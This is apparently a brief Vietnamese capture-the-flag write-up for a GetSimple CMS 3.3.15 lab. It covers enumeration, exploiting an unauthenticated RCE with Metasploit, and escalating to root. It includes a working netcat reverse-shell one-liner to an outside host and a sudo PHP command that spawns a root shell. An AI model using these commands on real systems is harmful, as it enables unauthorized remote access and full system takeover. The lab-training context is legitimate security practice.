# Lab - GetSimple CMS

## Enum

Nmap:

![alt text](image.png)

Gobuster


Recon thoong tin: 

Dùng GetSimple CMS phiên bản 3.3.15


Có CVE RCE unauthen 


Dùng MSF để khai thác 


Đổi payload để ổn định hơn 

Lấy flag user 

## Leo quyền

Cần tạo reverse shell để leo quyền 

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.167 5555 >/tmp/f`

`sudo -l`

Ta thấy có php chạy quyền root

dùng `sudo /usr/bin/php -r 'system("/bin/bash");'` để lên root 

Lấy flag root

